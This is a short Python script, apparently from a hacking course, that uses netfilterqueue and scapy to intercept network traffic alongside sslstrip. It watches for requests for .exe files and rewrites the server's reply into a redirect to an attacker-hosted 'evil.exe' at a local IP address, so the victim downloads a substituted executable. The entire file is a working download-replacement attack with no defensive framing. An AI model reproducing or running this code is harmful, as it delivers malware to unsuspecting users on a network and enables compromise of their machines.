import netfilterqueue

import scapy.all as scapy



ack_list = []

def set_load(packet, load):

    packet[scapy.Raw].load = load

    del packet[scapy.IP].len

    del packet[scapy.IP].chksum

    del packet[scapy.TCP].chksum

    return packet



def process_packet(packet):

    scapy_packet = scapy.IP(packet.get_payload())  # This will convert the packet payload to scapy packet

    if scapy_packet.haslayer(scapy.Raw):

        if scapy_packet[scapy.TCP].dport == 10000: # To make it work with sslstrip for HTTPS sites

            if ".exe" in scapy_packet[scapy.Raw].load and "10.0.2.23" not in scapy_packet[scapy.Raw].load:  # to make sure the program does not go into infinite loop when it detects our exe file.

                print("[+] exe Request")

                ack_list.append(scapy_packet[scapy.TCP].ack)

        elif scapy_packet[scapy.TCP].sport == 10000:  # To make it work with sslstrip for HTTPS sites

            if scapy_packet[scapy.TCP].seq in ack_list:

                ack_list.remove(scapy_packet[scapy.TCP].seq)

                print("[+]Replacing file")

                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.2.23/evil-files/evil.exe\n\n")

                packet.set_payload(bytes(modified_packet))





    packet.accept()  # This will accept the packet and forward it to the client computer allowing him to go that particular website





queue = netfilterqueue.NetfilterQueue()

queue.bind(0, process_packet)

queue.run()